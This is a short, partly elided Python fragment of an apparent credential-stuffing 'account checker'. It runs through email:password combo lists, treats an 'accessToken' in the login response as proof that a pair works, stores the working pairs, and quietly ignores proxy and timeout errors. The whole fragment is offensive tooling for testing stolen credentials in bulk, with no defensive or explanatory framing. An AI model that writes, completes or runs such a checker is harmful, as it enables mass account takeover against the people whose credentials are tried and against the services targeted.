...
def checkAccount(accountNumber):
    ...
    if any("accessToken" in s for s in response): # Check if the account is working.
		working.append(email[accountNumber] + ":" + password[accountNumber]) # Add it to the working account list
...
for i in range(len(email)): # For every combo
    try:
        checkAccount(i) # Check it
    except:
        pass # Handle errors, like the proxy not working or if the request times out
